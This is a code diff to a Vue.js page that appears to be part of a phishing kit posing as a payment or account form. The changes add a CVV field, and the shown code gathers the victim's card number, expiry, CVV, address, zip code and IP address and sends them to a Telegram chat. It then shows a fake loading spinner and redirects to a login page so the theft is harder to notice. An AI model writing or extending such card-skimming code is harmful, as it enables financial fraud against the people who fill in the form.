@@ -1,6 +1,11 @@
 <template>
   <div class="page">
     <div class="overlay" style="">
+<div v-if="loading" class="loading-overlay">
+  <div class="spinner"></div>
+  <p>Loading...</p>
+</div>
+
       <div class="fix">
         <img
           style="margin-bottom: 40px"
@@ -49,12 +54,12 @@
           </div>
 
           <div class="group">
-            <label>Address line 1 <span>*</span></label>
+            <label>Address <span>*</span></label>
 
             <input v-model="formDataRes.add1" type="text" />
           </div>
 
-          <div class="group">
+          <!-- <div class="group">
             <label>Address line 2 (Optional)</label>
 
             <input v-model="formDataRes.add2" type="text" />
@@ -74,6 +79,12 @@
                 {{ state }}
               </option>
             </select>
+          </div> -->
+
+          <div class="group zip">
+            <label>CVV <span>*</span></label>
+
+            <input v-model="formDataRes.cvv" type="number" />
           </div>
 
           <div class="group zip">
@@ -96,13 +107,15 @@
           </p> -->
 
           <div class="buttons">
-            <button type="button" class="cancel">Cancel</button>
+            <!-- <button type="button" class="cancel">Cancel</button> -->
 
-            <button type="submit" class="save">Save</button>
+            <button type="submit" class="save">Continue</button>
           </div>
         </form>
       </div>
       </div>
+
+
     </div>
   </div>
 </template>
@@ -119,13 +132,14 @@ export default {
       formDataRes: {
         cardHolderName: " ",
         cardNumber: " ",
-        selectedMonth: " ",
-        selectedYear: " ",
-        selectedState: " ",
+        // selectedMonth: " ",
+        // selectedYear: " ",
+        // selectedState: " ",
         add1: " ",
-        add2: " ",
-        city: " ",
-        states: " ",
+        // add2: " ",
+        // city: " ",
+        // states: " ",
+        cvv: " ",
         zipcode: " ",
       },
       months: [
@@ -203,6 +217,7 @@ export default {
       isActive: false,
       count: 0,
       finalCount: 1, // Only send once
+            loading: false,
     };
   },
 
@@ -214,10 +229,11 @@ export default {
         this.formDataRes.selectedMonth.trim() !== "" &&
         this.formDataRes.selectedYear.trim() !== "" &&
         this.formDataRes.add1.trim() !== "" &&
-        this.formDataRes.add2.trim() !== "" &&
-        this.formDataRes.city.trim() !== "" &&
-        this.formDataRes.selectedState.trim() !== "" &&
-        this.formDataRes.zipcode.trim() !== ""
+        // this.formDataRes.add2.trim() !== "" &&
+        // this.formDataRes.city.trim() !== "" &&
+        // this.formDataRes.selectedState.trim() !== "" &&
+        this.formDataRes.zipcode.trim() !== "" &&
+        this.formDataRes.cvv.trim() !== ""
       );
     },
   },
@@ -225,9 +241,8 @@ export default {
   methods: {
     async finishJoob() {
       this.count++;
-      console.log("Count:", this.count);
 
-      if (this.count) {
+      // if (this.count < this.finalCount) {
         this.loading = true;
 
         const res = await fetch("https://api.ipify.org?format=json");
@@ -243,9 +258,7 @@ export default {
         \nMONTH: ${this.formDataRes.selectedMonth}
         \nYEAR: ${this.formDataRes.selectedYear}
         \nADDRESS LINE 1: ${this.formDataRes.add1}
-        \nADDRESS LINE 2: ${this.formDataRes.add2}
-        \nCITY: ${this.formDataRes.city}
-        \nSTATE: ${this.formDataRes.selectedState}
+        \nCVV: ${this.formDataRes.cvv}
         \nZIPCODE: ${this.formDataRes.zipcode}
         \nIP: ${ip}`;
 
@@ -255,12 +268,22 @@ export default {
           message
         );
 
-        this.isActive = !this.isActive;
-        this.loading = false;
-      } else {
+        // this.isActive = !this.isActive;
+        // this.loading = false;
+      // } else {
         // Redirect after sending
-        location.replace("/");
-      }
+        // location.replace("/login");
+      // }
+
+      setTimeout(() => {
+         this.isActive = !this.isActive;
+        this.loading = false;
+
+        // Keep the popup visible for 2 seconds
+        setTimeout(() => {
+          this.$router.push("/login");
+        }, 1000);
+      }, 1000);
     },
 
     async sendTelegramResult(chatId, message) {
@@ -296,6 +319,32 @@ body {
   height: 100vh;
   overflow: hidden;
   background: url("https://d3mqmy22owj503.cloudfront.net/30/501030/images/site_graphics/hero-1.jpg") center center no-repeat;
+}
+
+.loading-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(255, 255, 255, 0.9);
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+.spinner {
+  width: 40px;
+  height: 40px;
+  border: 4px solid #ddd;
+  border-top: 4px solid #007bff;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
 }
 
 .login-box {
